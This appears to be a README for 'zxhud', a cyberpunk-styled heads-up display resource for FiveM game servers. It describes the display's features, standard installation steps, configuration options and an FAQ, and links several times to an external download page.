# zxhud - FiveM HUD v1.0 - Cyberpunk Game Interface 2026

> **A tailored FiveM HUD with a moody cyberpunk look, teal and gold highlights, plus a minimap overlay, camera state readout, and full vehicle telemetry panels.**

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/jamestyleruiv1471/zxhud-cyberpunk-hud-v1?style=flat-square)](https://github.com/jamestyleruiv1471/zxhud-cyberpunk-hud-v1)

---

<p align="center">
  <a href="https://jamestyleruiv1471.github.io/zxhud-cyberpunk-hud-v1/">
    <img src="https://img.shields.io/badge/Download-zxhud%20Script-brightgreen?style=for-the-badge" alt="Download zxhud Script">
  </a>
</p>

> **[Direct Download - zxhud](https://jamestyleruiv1471.github.io/zxhud-cyberpunk-hud-v1/)**

---

[Download Latest Build](https://jamestyleruiv1471.github.io/zxhud-cyberpunk-hud-v1/)

---

## What It Does

zxhud gives your FiveM setup a custom heads-up display shaped by a dark cyberpunk design language. It pairs a bespoke minimap overlay with live driving data such as gear, speed, fuel, and engine condition. The teal and gold palette keeps the interface visually striking while still easy to read in the middle of gameplay.

The script is built to surface the information that matters most while driving or navigating. A camera status indicator and zone ability display improve situational awareness, and the use of smooth CSS motion plus glassmorphism panels adds a refined, modern finish. Ongoing updates help keep the resource aligned with current FiveM builds, while community input continues to guide improvements.

---

## Included Features

- Cyberpunk-style dark UI with gold accent colors for an immersive presentation
- Custom minimap overlay designed to blend cleanly into the FiveM HUD
- Camera status indicator that reflects the active camera mode and state
- Camera zone ability display for better awareness of nearby conditions
- Telemetry panels for gear, speed, fuel, and engine status
- Smooth CSS animations across the interface
- Glassmorphism panel styling for depth and translucent layering
- Teal highlight accents that work alongside the main gold color theme

---

## Installation

1. Download the latest zxhud build from the link above.
2. Extract the contents into your FiveM resources folder (`resources/[local]/zxhud/`).
3. Add `ensure zxhud` to your server configuration file (`server.cfg`).
4. Restart your FiveM server or use the `refresh` command followed by `start zxhud`.

No additional dependencies or configuration files are required for basic operation.

---

## Configuration

| Setting | Default | Description |
|---------|---------|-------------|
| minimap_enabled | true | Toggle custom minimap overlay visibility |
| camera_indicator | true | Enable camera status display |
| vehicle_telemetry | true | Show gear, speed, fuel, and engine data |
| animation_speed | 300ms | Adjust CSS animation transition duration |
| accent_color | #ffd700 | Change gold accent to custom hex color |

To change these values, edit the `config.lua` file in the script folder.

---

## Compatibility

- FiveM server platform (Windows and Linux)
- Tested with FiveM builds from 2025 onward
- Compatible with most popular FiveM frameworks and vehicle scripts
- Known limitation: Custom minimap may conflict with other HUD mods using overlay systems
- Vehicle telemetry requires supported vehicle entities; some custom vehicles may not display all data

---

## FAQ

**How do I install zxhud on my FiveM server?**  
Put the script folder in your resources directory, add `ensure zxhud` to server.cfg, then restart the server or start the resource.

**Will updates overwrite my custom settings?**  
Your configuration is kept in the config file and should remain intact through updates unless the changelog says otherwise.

**Can I modify the theme colors?**  
Yes. The accent color and other visual options can be adjusted in the configuration file.

**Does this work with other HUD scripts?**  
The custom minimap overlay can clash with other HUD changes. For the cleanest result, disable other minimap resources.

**Where is vehicle data stored?**  
Telemetry is pulled directly from the game client and shown in real time. Nothing is stored or sent anywhere else.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
